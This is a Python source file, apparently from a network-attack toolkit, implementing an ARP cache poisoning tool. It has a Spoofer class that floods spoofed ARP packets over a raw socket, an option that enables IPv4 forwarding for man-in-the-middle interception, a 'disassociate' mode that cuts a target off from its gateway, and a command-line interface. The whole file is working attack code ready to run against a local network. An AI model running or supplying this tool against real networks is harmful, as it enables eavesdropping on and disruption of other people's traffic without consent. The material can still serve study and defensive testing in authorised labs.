#!/usr/bin/python
# -*- coding: utf-8 -*-
import os
import sys

sys.path.append(os.path.abspath(__file__).split('backend')[0])
import itertools
import time
from socket import htons, ntohs, socket, PF_PACKET, SOCK_RAW
from time import ctime

from backend.arp_spoofing.packets import ARPSetupProxy


class Spoofer(object):
    def __init__(self, targetip: str, interface: str = None, attackermac: str = None,
                 gatewaymac: str = None, gatewayip: str = None, targetmac: str = None,
                 interval: float = 1., disassociate: bool = False, ipforward: bool = False):
        self.__interval = interval
        self.__ipv4_forwarding = ipforward
        self.__arp = ARPSetupProxy(interface, attackermac, gatewaymac,
                                   gatewayip, targetmac, targetip,
                                   disassociate)

    def execute(self):
        try:
            print(f'[+] Starting Arp Spoofing at {ctime(time.time())}')
            self.__check_ipv4_forwarding()
            self.__display_setup_prompt()
            self.__send_attack_packets()
        except KeyboardInterrupt:
            raise IOError('[!] ARP Spoofing attack aborted.')

    def __check_ipv4_forwarding(self, config='/proc/sys/net/ipv4/ip_forward'):
        print('[+] checking ipv4 forwarding')
        if self.__ipv4_forwarding is True:
            with open(config, mode='r+', encoding='utf_8') as config_file:
                line = next(config_file)
                config_file.seek(0)
                config_file.write(line.replace('0', '1'))

    def __display_setup_prompt(self):
        print('[>] ARP Spoofing configuration:')
        configurations = {'IPv4 Forwarding': str(self.__ipv4_forwarding),
                          'Interface': self.__arp.interface,
                          'Attacker MAC': self.__arp.packets.attacker_mac,
                          'Gateway IP': self.__arp.packets.gateway_ip,
                          'Gateway MAC': self.__arp.packets.gateway_mac,
                          'Target IP': self.__arp.packets.target_ip,
                          'Target MAC': self.__arp.packets.target_mac}

        for setting, value in configurations.items():
            print('{0: >7} {1: <16}{2:.>25}'.format('[>] ', setting, value))

        while True:
            proceed = input('[!] ARP packets ready. Execute the attack with '
                            'these settings? (Y/N) ').lower().strip()
            if proceed == 'y':
                print('[+] ARP Spoofing attack initiated. Press Ctrl-C to '
                      'abort.')
                break
            if proceed == 'n':
                raise KeyboardInterrupt

    def __send_attack_packets(self):
        with socket(PF_PACKET, SOCK_RAW, ntohs(0x0800)) as sock:
            sock.bind((self.__arp.interface, htons(0x0800)))
            spin = self.__spinning_state('Attacking')
            next(spin)
            while True:
                for packet in self.__arp.packets:
                    sock.send(packet)
                print(next(spin), flush=True, end='\r')
                time.sleep(self.__interval)

    @staticmethod
    def __spinning_state(msg):
        for char in itertools.cycle('|/-\\'):
            status = char + ' ' + msg
            yield status


# argument name:(type, argument key, desc, required)
ARGS_INFO = {'Target IP': ('str', 'targetip', 'IP address currently assigned to the target.', True),
             'Interface': ('str', 'interface', 'Interface on the attacker machine to send packets from.', False),
             'Attacker Mac': ('str', 'attackermac', 'MAC address of the NIC from which the attacker '
                                                    'machine will send the spoofed ARP packets.', False),
             'Gateway Mac': ('str', 'gatewaymac', 'MAC address of the NIC associated to the gateway', False),
             'Target Mac': ('str', 'targetmac', 'MAC address of the NIC associated to the target.', False),
             'Gateway IP': ('str', 'gatewayip', 'IP address currently assigned to the gateway.', False),
             'Interval': ('float', 'interval', 'Time in between each transmission of spoofed ARP '
                                               'packets (defaults to 1 second).', False),
             'Disassociate': ('store', 'disassociate', 'Execute a disassociation attack in which a '
                                                       'randomized MAC address is set for the attacker '
                                                       'machine, effectively making the target host '
                                                       'send packets to a non-existent gateway.', False),
             'IP Forward': ('store', 'ipforward', 'Temporarily enable forwarding of IPv4 packets '
                                                  'on the attacker system until the next reboot. '
                                                  'Set this to intercept information between the '
                                                  'target host and the gateway, performing a '
                                                  'man-in-the-middle attack. Requires '
                                                  'administrator privileges.', False),
             }


def process_args():
    import argparse
    parser = argparse.ArgumentParser(
        description='Execute ARP Cache Poisoning attacks (a.k.a "ARP '
                    'Spoofing") on local networks.')
    options = parser.add_mutually_exclusive_group()
    parser.add_argument('targetip', type=str, metavar='TARGET_IP',
                        help=ARGS_INFO['Target IP'][2])
    parser.add_argument('-i', '--interface', type=str,
                        help=ARGS_INFO['Interface'][2])
    parser.add_argument('--attackermac', type=str, metavar='MAC',
                        help=ARGS_INFO['Attacker Mac'][2])
    parser.add_argument('--gatewaymac', type=str, metavar='MAC',
                        help=ARGS_INFO['Gateway Mac'][2])
    parser.add_argument('--targetmac', type=str, metavar='MAC',
                        help=ARGS_INFO['Target Mac'][2])
    parser.add_argument('--gatewayip', type=str, metavar='IP',
                        help=ARGS_INFO['Gateway IP'][2])
    parser.add_argument('--interval', type=float, default=1, metavar='TIME',
                        help=ARGS_INFO['Interval'][2])
    options.add_argument('-d', '--disassociate', action='store_true',
                         help=ARGS_INFO['Disassociate'][2])
    options.add_argument('-f', '--ipforward', action='store_true',
                         help=ARGS_INFO['IP Forward'][2])
    return parser.parse_args()


def main(args=None):
    if not args:
        args = vars(process_args())
    spoofer = Spoofer(**args)
    spoofer.execute()


if __name__ == '__main__':
    main()
